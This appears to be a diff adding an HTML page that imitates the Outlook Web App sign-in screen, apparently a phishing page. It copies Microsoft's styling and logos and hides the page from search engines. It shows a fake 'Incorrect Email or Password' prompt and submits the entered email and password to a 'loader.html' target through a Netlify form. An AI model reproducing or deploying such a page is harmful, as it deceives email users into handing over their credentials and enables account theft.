@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="Robots" content="NOINDEX, NOFOLLOW">
+    <title>Outlook</title>
+    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
+    <style>
+        @font-face {
+            font-family: "wf_segoe-ui_normal";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
+                 url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.ttf") format("truetype");
+        }
+
+        @font-face {
+            font-family: "wf_segoe-ui_semilight";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
+                 url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.ttf") format("truetype");
+        }
+
+        @font-face {
+            font-family: "wf_segoe-ui_semibold";
+            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
+                 url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.ttf") format("truetype");
+        }
+
+        body.rtl { text-align: right; direction: rtl; }
+        body, .mouse, .twide, .tnarrow, form { height: 100%; width: 100%; margin: 0px; }
+        .mouse, .twide { min-width: 650px; min-height: 650px; position: absolute; top: 0px; bottom: 0px; left: 0px; right: 0px; }
+        .sidebar { background-color: #0072C6; }
+        .mouse .sidebar, .twide .sidebar { position: absolute; top: 0px; bottom: 0px; left: 0px; display: inline-block; width: 332px; }
+        .tnarrow .sidebar { display: none; }
+        .mouse .owaLogoContainer, .twide .owaLogoContainer { margin: 213px auto auto 109px; text-align: left; }
+        .tnarrow .owaLogo { display: none; }
+        .mouse .owaLogoSmall, .twide .owaLogoSmall { display: none; }
+        .logonDiv { text-align: left; }
+        .rtl .logonDiv { text-align: right; }
+        .mouse .logonContainer, .twide .logonContainer { padding-top: 174px; padding-left: 464px; padding-right: 142px; position: absolute; top: 0px; bottom: 0px; left: 0px; right: 0px; text-align: center; }
+        .mouse .logonDiv, .twide .logonDiv { position: relative; vertical-align: top; display: inline-block; width: 423px; }
+        .tnarrow .logonDiv { margin: 25px auto auto -130px; position: absolute; left: 50%; width: 260px; padding-bottom: 20px; }
+        .twide .signInImageHeader, .tnarrow .signInImageHeader { display: none; }
+        .mouse .signInImageHeader { margin-bottom: 22px; }
+        .twide .mouseHeader { display: none; }
+        .mouse .twideHeader { display: none; }
+
+        input::-webkit-input-placeholder { font-size: 16px; color: #98A3A6; }
+        input:-moz-placeholder { font-size: 16px; color: #98A3A6; }
+
+        .tnarrow .signInInputLabel, .twide .signInInputLabel { display: none; }
+        .mouse .signInInputLabel { margin-bottom: 2px; }
+        .mouse .showPasswordCheck { display: none; }
+
+        .signInInputText {
+            border: 1px solid #98A3A6;
+            color: #333333;
+            border-radius: 0;
+            -moz-border-radius: 0;
+            -webkit-border-radius: 0;
+            box-shadow: none;
+            -moz-box-shadow: none;
+            -webkit-box-shadow: none;
+            -webkit-appearance: none;
+            background-color: #FDFDFD;
+            width: 250px;
+            margin-bottom: 10px;
+            box-sizing: content-box;
+            -moz-box-sizing: content-box;
+            -webkit-box-sizing: content-box;
+        }
+
+        .mouse .signInInputText {
+            height: 22px;
+            font-size: 12px;
+            padding: 3px 5px;
+            color: #333333;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-bottom: 20px;
+        }
+
+        .twide .signInInputText, .tnarrow .signInInputText {
+            border-color: #666666;
+            height: 22px;
+            font-size: 16px;
+            color: #000000;
+            padding: 7px 7px;
+            font-family: 'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-bottom: 20px;
+            width: 264px;
+        }
+
+        .signInEnter {
+            font-size: 22px;
+            color: #0072C6;
+            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 20px;
+        }
+
+        .twide .signInEnter { margin-top: 17px; font-size: 29px; }
+        .tnarrow .signInEnter { margin-top: 2px; font-size: 29px; position: relative; float: left; left: 50%; }
+
+        .signinbutton { cursor: pointer; display: inline; }
+        .mouse .signinbutton { padding: 0px 8px 5px 8px; margin-left: -8px; }
+        .rtl .mouse .signinbutton { margin-right: -8px; }
+        .tnarrow .signinbutton { position: relative; float: left; left: -50%; }
+
+        .signInExpl {
+            font-size: 12px;
+            color: #999999;
+            font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+            margin-top: 5px;
+        }
+
+        .imgLnk { vertical-align: middle; line-height: 2; margin-top: -2px; }
+        .signinTxt { padding-left: 11px; padding-right: 11px; }
+
+        .hidden-submit {
+            border: 0 none;
+            height: 0;
+            width: 0;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .signInBg { margin: 0px; }
+    </style>
+</head>
+<body class="signInBg" style="background: #f2f2f2 url('linelogo.png') repeat-x">
+
+    <div id="mainLogonDiv" class="mouse">
+        <div class="sidebar">
+            <div class="owaLogoContainer">
+                <img src="waologo.png" class="owaLogo" aria-hidden="true">
+                <img src="waologosmall.png" class="owaLogoSmall" aria-hidden="true">
+            </div>
+        </div>
+        <div class="logonContainer">
+            <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
+                <div class="signInImageHeader" role="heading" aria-label="Outlook">
+                    <img class="mouseHeader" src="oLogo.png" alt="Outlook">
+                </div>
+
+                <div class="signInInputLabel" aria-hidden="true">
+                    <p style="color:red;">Incorrect Email or Password</p>
+                    <p>Please check your details and try again</p>
+                    &nbsp;
+                </div>
+
+                <form id="loginForm" method="POST" name="OWA2" action="loader.html" onsubmit="return validateForm(event)" netlify>
+                    <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Email Address:</div>
+                    <div>
+                        <input id="username" name="email" type="email" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" required placeholder="">
+                    </div>
+
+                    <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
+                    <div>
+                        <input id="password" name="password" type="password" class="signInInputText" aria-labelledby="passwordLabel" required placeholder="">
+                    </div>
+
+                    <div class="showPasswordCheck signInCheckBoxText">
+                        <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
+                        <span>Show password</span>
+                    </div>
+
+                    <div id="expltxt" class="signInExpl" role="alert"></div>
+
+                    <div class="signInEnter">
+                        <div class="signinbutton" role="button" tabindex="0" onclick="clkLgn()">
+                            <img class="imgLnk" src="signlogo.png" alt="">
+                            <span class="signinTxt">sign in</span>
+                        </div>
+                        <input name="isUtf8" value="1" type="hidden">
+                    </div>
+
+                    <div class="hidden-submit">
+                        <input type="submit" tabindex="-1">
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var mainLogonDivClassName = 'mouse';
+        var showPlaceholderText = false;
+
+        if (mainLogonDivClassName === "tnarrow") {
+            showPlaceholderText = true;
+            document.write('<meta name="viewport" content="width = 320, initial-scale = 1.0, user-scalable = no" />');
+        } else if (mainLogonDivClassName === "twide") {
+            showPlaceholderText = true;
+        }
+
+        function setPlaceholderText() {
+            document.getElementById("username").placeholder = "user name";
+            document.getElementById("password").placeholder = "password";
+        }
+
+        function showPasswordClick() {
+            const passwordField = document.getElementById("password");
+            const showCheck = document.getElementById("showPasswordCheck");
+            passwordField.type = showCheck.checked ? "text" : "password";
+        }
+
+        function validateForm(event) {
+            const email = document.getElementById("username");
+            const password = document.getElementById("password");
+            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            const expltxt = document.getElementById("expltxt");
+
+            expltxt.textContent = "";
+
+            if (!email.value.trim() || !password.value.trim()) {
+                expltxt.textContent = "Both email and password are required.";
+                if (event) event.preventDefault();
+                return false;
+            }
+
+            if (!emailPattern.test(email.value)) {
+                expltxt.textContent = "Please enter a valid email address.";
+                if (event) event.preventDefault();
+                return false;
+            }
+
+            return true;
+        }
+
+        function clkLgn() {
+            if (validateForm()) {
+                document.getElementById("loginForm").requestSubmit();
+            }
+        }
+
+        function checkSubmit(e) {
+            if (e && e.keyCode === 13) {
+                if (e.preventDefault) e.preventDefault();
+                clkLgn();
+            }
+        }
+
+        if (showPlaceholderText) {
+            setPlaceholderText();
+        }
+    </script>
+</body>
+</html>
